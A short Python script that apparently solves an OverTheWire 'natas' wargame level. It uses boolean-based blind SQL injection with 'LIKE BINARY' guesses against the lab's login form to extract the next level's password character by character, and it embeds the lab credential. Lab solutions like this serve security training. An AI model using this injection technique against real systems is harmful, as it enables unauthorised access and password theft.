# natas 15->16
#!/usr/bin/env python
# Author : vigov5
# -*- coding: utf-8 -*-

import httplib
import urllib
import re
import base64

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX = 32

headers = {}
params = {}
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
conn = httplib.HTTPConnection("natas15.natas.labs.overthewire.org")
base64string = base64.encodestring('%s:%s' % (username, password)).replace('\n', '')
headers["Authorization"] = "Basic %s" % base64string   
headers["Content-Type"] = "application/x-www-form-urlencoded"


USERINPUT = 'natas16" and password LIKE BINARY "'
count = 0
passwd = ""
while count < MAX:
	for c in charset:
		print 'Check password : ' + passwd + c
		params["username"] = USERINPUT + passwd + c + '%'
		conn.request("POST", "", urllib.urlencode(params), headers)
		r1 = conn.getresponse()
		data = r1.read()
		if data.count("This user exists.") != 0:
			passwd += c
			print "OK, Current passwd is " + passwd
			count += 1
		conn.close()
